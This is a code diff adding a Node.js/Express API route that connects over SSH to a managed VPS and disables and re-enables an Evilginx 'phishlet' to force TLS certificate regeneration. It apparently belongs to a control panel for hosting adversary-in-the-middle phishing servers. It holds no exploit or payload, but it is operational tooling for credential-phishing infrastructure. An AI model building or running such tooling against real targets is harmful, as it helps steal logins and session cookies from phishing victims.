@@ -571,6 +571,55 @@ router.post('/:id/restart', authenticate, checkVPSOwnership, async (req, res) =>
     }
 });
 
+// POST /api/vps/:id/force-ssl - Force SSL certificate regeneration for a phishlet
+router.post('/:id/force-ssl', authenticate, checkVPSOwnership, async (req, res) => {
+    try {
+        const { phishlet } = req.body;
+        
+        if (!phishlet || typeof phishlet !== 'string') {
+            return res.status(400).json({ success: false, message: 'Phishlet name is required' });
+        }
+
+        // Sanitize phishlet name - only allow alphanumeric and dashes
+        const sanitizedPhishlet = phishlet.replace(/[^a-zA-Z0-9-_]/g, '');
+        if (sanitizedPhishlet !== phishlet) {
+            return res.status(400).json({ success: false, message: 'Invalid phishlet name' });
+        }
+
+        if (!req.vps.is_deployed) {
+            return res.status(400).json({ success: false, message: 'VPS not deployed yet. Please deploy first.' });
+        }
+
+        // Connect to VPS and run certificate regeneration commands
+        const conn = await sshService.getConnection(req.params.id, req.vps);
+        
+        // Disable and re-enable the phishlet to force certificate regeneration
+        const commands = [
+            `cd ${req.vps.install_path || '/opt/evilginx'} && echo "phishlets disable ${sanitizedPhishlet}" | ./evilginx -developer 2>&1 || true`,
+            `sleep 2`,
+            `cd ${req.vps.install_path || '/opt/evilginx'} && echo "phishlets enable ${sanitizedPhishlet}" | ./evilginx -developer 2>&1 || true`
+        ];
+
+        let output = '';
+        for (const cmd of commands) {
+            const result = await sshService.executeCommand(conn, cmd, 60000);
+            output += result.stdout + '\n' + result.stderr + '\n';
+        }
+
+        // Restart the service to apply changes
+        await sshService.restartService(req.params.id);
+
+        res.json({ 
+            success: true, 
+            message: `SSL certificates regenerated for ${sanitizedPhishlet}`,
+            data: { output: output.trim() }
+        });
+    } catch (error) {
+        console.error('Force SSL error:', error);
+        res.status(500).json({ success: false, message: 'Failed to regenerate SSL certificates: ' + error.message });
+    }
+});
+
 // GET /api/vps/:id/logs - Get service logs
 router.get('/:id/logs', authenticate, checkVPSOwnership, async (req, res) => {
     try {
